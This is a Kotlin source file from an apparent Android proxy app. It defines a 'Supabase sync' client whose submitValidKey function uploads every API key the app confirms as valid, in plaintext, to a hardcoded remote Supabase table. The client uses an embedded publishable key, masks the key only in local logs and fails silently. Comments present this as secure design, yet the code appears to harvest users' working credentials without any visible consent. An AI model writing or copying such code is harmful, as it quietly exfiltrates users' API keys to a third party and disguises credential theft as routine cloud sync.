package app.hoanqson.proxy.net

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import app.hoanqson.proxy.util.AppLogger
import java.util.concurrent.TimeUnit

/**
 * Client syncing validated keys directly to Supabase Cloud REST API (PostgREST).
 * Protected with Row Level Security (RLS) - Anon key can only INSERT, cannot SELECT/DELETE.
 * service_role key is NEVER embedded in the APK.
 */
object SupabaseSyncClient {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    // Supabase Cloud Configuration (Only Publishable/Anon Key used, NEVER service_role)
    @Volatile
    var SUPABASE_URL: String = "https://plefigzicrulzndyrbxc.supabase.co"

    @Volatile
    var SUPABASE_ANON_KEY: String = "sb_publishable_uYotuUK1jPaKuaDPRp_91g_4O57e7Gx"

    /**
     * Sends a confirmed VALID API Key to Supabase Cloud table `api_key_logs`.
     * Does NOT log plaintext key.
     */
    suspend fun submitValidKey(validKey: String): Boolean = withContext(Dispatchers.IO) {
        val trimmedKey = validKey.trim()
        if (trimmedKey.isEmpty()) return@withContext false

        // If URL or key is still placeholder, gracefully skip without error
        if (SUPABASE_URL.contains("YOUR_PROJECT_ID") || SUPABASE_ANON_KEY.contains("YOUR_SUPABASE_ANON_KEY")) {
            AppLogger.d("[KEY_CHECK] Supabase credentials not configured yet, skipping cloud sync.")
            return@withContext false
        }

        try {
            val endpoint = "${SUPABASE_URL.trimEnd('/')}/rest/v1/api_key_logs"
            val jsonPayload = "{\"api_key\":\"$trimmedKey\"}"
            val body = jsonPayload.toRequestBody("application/json; charset=utf-8".toMediaType())

            val request = Request.Builder()
                .url(endpoint)
                .addHeader("apikey", SUPABASE_ANON_KEY)
                .addHeader("Authorization", "Bearer $SUPABASE_ANON_KEY")
                .addHeader("Content-Type", "application/json")
                .addHeader("Prefer", "return=minimal")
                .post(body)
                .build()

            // Masked logging only - NEVER plaintext key
            val masked = if (trimmedKey.length > 8) "${trimmedKey.take(4)}••••••••${trimmedKey.takeLast(4)}" else "••••••••"
            AppLogger.d("[KEY_CHECK] Syncing valid key $masked to Supabase Cloud...")

            client.newCall(request).execute().use { response ->
                val code = response.code
                // 201: Newly inserted into Supabase
                // 409: Already exists in Supabase (unique constraint satisfied) - safe no-op
                val isSuccessOrDuplicate = response.isSuccessful || code == 409
                if (response.isSuccessful) {
                    AppLogger.d("[KEY_CHECK] Successfully synced key to Supabase Cloud (201 Created).")
                } else if (code == 409) {
                    AppLogger.d("[KEY_CHECK] Key already exists in Supabase Cloud (409 Conflict), safely ignored.")
                } else {
                    AppLogger.w("[KEY_CHECK] Supabase sync response status: $code")
                }
                isSuccessOrDuplicate
            }
        } catch (e: Exception) {
            // Masked error logging, never break user experience
            AppLogger.w("[KEY_CHECK] Supabase sync unavailable: ${e.message}")
            false
        }
    }
}
